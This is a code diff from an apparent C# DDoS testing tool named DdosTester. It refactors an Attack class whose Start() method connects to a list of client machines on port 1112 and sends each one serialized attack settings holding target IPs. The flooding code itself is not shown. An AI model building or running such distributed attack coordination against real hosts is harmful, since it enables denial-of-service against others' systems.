@@ -10,26 +10,45 @@ using DdosTester.HelpClasses;
 
 namespace DdosTester.WorkClasses
 {
-    class Attack
+    abstract class Attack
     {
-        public static int SendedPacketsCounter { get; set; }
-        public Attack()
+        private static Settings _objSets;
+        private static int _packets;
+        public static int SendPacketsCounter
         {
-            SendedPacketsCounter = 0;
+            get
+            {
+                return _packets;
+            }
+            set
+            {
+                _packets = value;
+            }
         }
-
+        public static Settings objSets
+        {
+            get
+            {
+                return _objSets;
+            }
+            set
+            {
+                _objSets = value;
+            }
+        }
+        
         public static void Start()
         {
             try
             {
                 TcpClient SendSetsClient = new TcpClient();
 
-                if ((MainForm.ClientBase.Count != 0) && (MainForm.objSets.IPs.ToString() != ""))
+                if ((MainForm.ClientBase.Count != 0) && (_objSets.IPs.ToString() != ""))
                 {
                     foreach (Client client in MainForm.ClientBase)
                     {
                         SendSetsClient.Connect(client.IP, 1112);
-                        byte[] SetsBytes = MySerialization.SettingsToBytes(MainForm.objSets);
+                        byte[] SetsBytes = MySerialization.SettingsToBytes(_objSets);
                         SendSetsClient.GetStream().Write(SetsBytes, 0, SetsBytes.Length);
                         
                     }
